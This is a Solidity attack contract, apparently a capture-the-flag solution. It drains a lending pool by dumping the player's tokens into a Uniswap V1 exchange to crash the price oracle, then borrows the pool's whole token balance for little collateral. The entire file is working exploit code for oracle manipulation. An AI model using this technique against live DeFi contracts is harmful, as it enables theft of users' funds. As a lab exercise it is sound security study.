// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PuppetPool.sol";

interface IUniswapV1Exchange {
    function tokenToEthTransferInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline, address payable recipient) external returns (uint256);
}

contract PuppetPoolAttacker {
    IUniswapV1Exchange public immutable exchange;
    PuppetPool public immutable pool;
    address public immutable player;
    address public immutable deployer;
    uint256 public constant PLAYER_INITIAL_TOKEN_BALANCE = 1000 * 10 ** 18;
    uint256 public constant PLAYER_INITIAL_ETH_BALANCE = 25 * 10 ** 18;
    uint256 public constant POOL_INITIAL_TOKEN_BALANCE = 100000 * 10 ** 18;


    constructor(address _pool, address _player) payable {
        pool = PuppetPool(_pool);
        exchange = IUniswapV1Exchange(pool.uniswapPair());
        player = _player;
        deployer = msg.sender;
        attack();
    }

    function attack() public payable {
        pool.token().transferFrom(player, address(this), PLAYER_INITIAL_TOKEN_BALANCE);
        pool.token().approve(address(exchange), PLAYER_INITIAL_TOKEN_BALANCE);
        exchange.tokenToEthTransferInput(PLAYER_INITIAL_TOKEN_BALANCE, 1, block.timestamp, payable(address(this)));
        pool.borrow{value: address(this).balance}(POOL_INITIAL_TOKEN_BALANCE, player);
    }

    receive() external payable {}
}